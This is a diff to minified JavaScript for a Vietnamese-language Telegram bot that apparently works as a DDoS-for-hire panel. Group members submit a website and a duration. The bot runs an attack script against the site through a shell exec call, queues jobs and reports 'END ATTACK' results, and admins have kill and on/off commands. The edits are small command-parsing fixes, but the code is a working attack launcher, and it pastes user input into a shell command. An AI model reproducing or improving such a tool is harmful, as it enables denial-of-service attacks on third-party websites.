@@ -12,7 +12,7 @@ const bot=new TelegramBot(t,{polling:!0}),h=`📜 Hướng dẫn:\n<code>https:/
 bot.on('message',msg=>{
 const {chat:{id:c},text,from:{id:u,username:n,f:n2},date}=msg,ad=a.has(u+''),gr=g.has(c+''),cl=n||n2;
 if(date*1000<Date.now()-60000||!gr||!text)return;
-if(text==='/help')return bot.sendMessage(c,`${cl?`@${cl} `:''}${h}`,{parse_mode:'HTML'});
+if(text.trim()==='/help')return bot.sendMessage(c,`${cl?`@${cl} `:''}${h}`,{parse_mode:'HTML'});
 if(text.startsWith('http')){
 if(!y)return bot.sendMessage(c,'❌ Bot đang tắt',{parse_mode:'HTML'});
 const [h,t]=text.split(' ');if(!h||isNaN(t))return bot.sendMessage(c,'🚫 Sai định dạng: <code>https://site.com 60</code>',{parse_mode:'HTML'});
@@ -26,6 +26,6 @@ exec(`./${C.script} "${h}" "${du}"`,{shell:'/bin/bash'},(e,o,er)=>{if(e)return;
 bot.sendMessage(c,JSON.stringify({Status:"👽 END ATTACK 👽",Caller:`@${cl}`,"PID Attack":pid,Website:h,Methods:m,Time:`${du} Giây`,EndTime:new Date().toLocaleString('vi-VN',{timeZone:'Asia/Ho_Chi_Minh'})},null,2),{parse_mode:'HTML'});x.delete(pid);
 if(q.length&&x.size<L.concurrent){const n=q.shift();bot.sendMessage(n.c,`📥 Bắt đầu: ${n.h} ${n.t}s`);bot.emit('message',{chat:{id:n.c},from:{id:n.u,username:n.cl},text:`${n.h} ${n.t}`});}});return;}
 if(!ad)return;
-if(text==='/pkill'){exec('pkill -9 -f "node.*\\.js"',(e,o,er)=>{if(e)return;bot.sendMessage(c,'✅ Đã dừng tất cả tiến trình',{parse_mode:'HTML'});x.clear();q=[];});return;}
-if(text==='/on'){y=!0;bot.sendMessage(c,'✅ Bot đã bật',{parse_mode:'HTML'});return;}
-if(text==='/off'){y=!1;bot.sendMessage(c,'✅ Bot đã tắt',{parse_mode:'HTML'});return;}});
+if(text.trim()==='/pkill'){exec('pkill -9 -f "node.*\\.js"',(e,o,er)=>{bot.sendMessage(c,e?'❌ Lỗi khi dừng tiến trình':'✅ Đã dừng tất cả tiến trình',{parse_mode:'HTML'});x.clear();q=[];});return;}
+if(text.trim()==='/on'){y=!0;bot.sendMessage(c,'✅ Bot đã bật',{parse_mode:'HTML'});return;}
+if(text.trim()==='/off'){y=!1;bot.sendMessage(c,'✅ Bot đã tắt',{parse_mode:'HTML'});return;}});
